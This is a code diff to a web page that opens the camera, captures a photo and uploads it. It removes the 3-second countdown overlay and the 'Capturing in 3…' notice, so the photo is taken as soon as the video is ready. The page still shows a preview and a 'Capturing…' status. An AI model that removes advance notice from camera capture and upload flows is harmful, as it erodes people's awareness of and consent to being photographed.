@@ -117,39 +117,6 @@
       transform: scaleX(-1);
     }
 
-    .countdown-overlay {
-      position: absolute;
-      inset: 0;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      background: rgba(10, 10, 15, 0.65);
-      backdrop-filter: blur(4px);
-      opacity: 0;
-      pointer-events: none;
-      transition: opacity 0.3s;
-    }
-
-    .countdown-overlay.visible {
-      opacity: 1;
-      pointer-events: auto;
-    }
-
-    .countdown-num {
-      font-family: "Space Mono", monospace;
-      font-size: clamp(4rem, 18vw, 7rem);
-      font-weight: 700;
-      color: var(--accent2);
-      text-shadow: 0 0 60px rgba(34, 211, 238, 0.6);
-      animation: pop 0.85s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
-    }
-
-    @keyframes pop {
-      0% { transform: scale(0.4); opacity: 0; }
-      40% { transform: scale(1.08); opacity: 1; }
-      100% { transform: scale(1); opacity: 1; }
-    }
-
     .status {
       margin-top: 1.25rem;
       font-family: "Space Mono", monospace;
@@ -247,9 +214,6 @@
     <div class="panel">
       <div class="video-shell">
         <video id="preview" autoplay playsinline muted></video>
-        <div id="countdownOverlay" class="countdown-overlay" aria-live="polite">
-          <span id="countdownNum" class="countdown-num">3</span>
-        </div>
       </div>
       <p id="status" class="status">Requesting camera…</p>
 
@@ -274,8 +238,6 @@
 
     const preview = document.getElementById("preview");
     const statusEl = document.getElementById("status");
-    const countdownOverlay = document.getElementById("countdownOverlay");
-    const countdownNum = document.getElementById("countdownNum");
     const successPanel = document.getElementById("successPanel");
     const resultImg = document.getElementById("resultImg");
     const successDetail = document.getElementById("successDetail");
@@ -331,20 +293,21 @@
       });
     }
 
-    function sleep(ms) {
-      return new Promise((r) => setTimeout(r, ms));
-    }
-
-    async function runCountdown() {
-      countdownOverlay.classList.add("visible");
-      for (let n = 3; n >= 1; n--) {
-        countdownNum.textContent = String(n);
-        countdownNum.style.animation = "none";
-        void countdownNum.offsetWidth;
-        countdownNum.style.animation = "pop 0.85s cubic-bezier(0.34, 1.56, 0.64, 1) forwards";
-        await sleep(1000);
-      }
-      countdownOverlay.classList.remove("visible");
+    /** Wait until the video element has frame dimensions (required for capture; not an artificial delay). */
+    function waitForVideoReady() {
+      return new Promise((resolve) => {
+        const check = () => {
+          if (preview.videoWidth > 0 && preview.videoHeight > 0) {
+            resolve();
+            return;
+          }
+          requestAnimationFrame(check);
+        };
+        preview.addEventListener("loadedmetadata", check, { once: true });
+        preview.addEventListener("loadeddata", check, { once: true });
+        if (preview.videoWidth > 0) check();
+        else requestAnimationFrame(check);
+      });
     }
 
     async function uploadPhoto(base64) {
@@ -368,13 +331,11 @@
       let stream;
       try {
         stream = await startCamera();
-        setStatus("Camera ready. <strong>Capturing in 3…</strong>");
+        await waitForVideoReady();
       } catch (e) {
         setStatus("Camera access denied or unavailable. Allow camera and reload.", true);
         return;
       }
-
-      await runCountdown();
 
       setStatus("Capturing…");
       let blob;
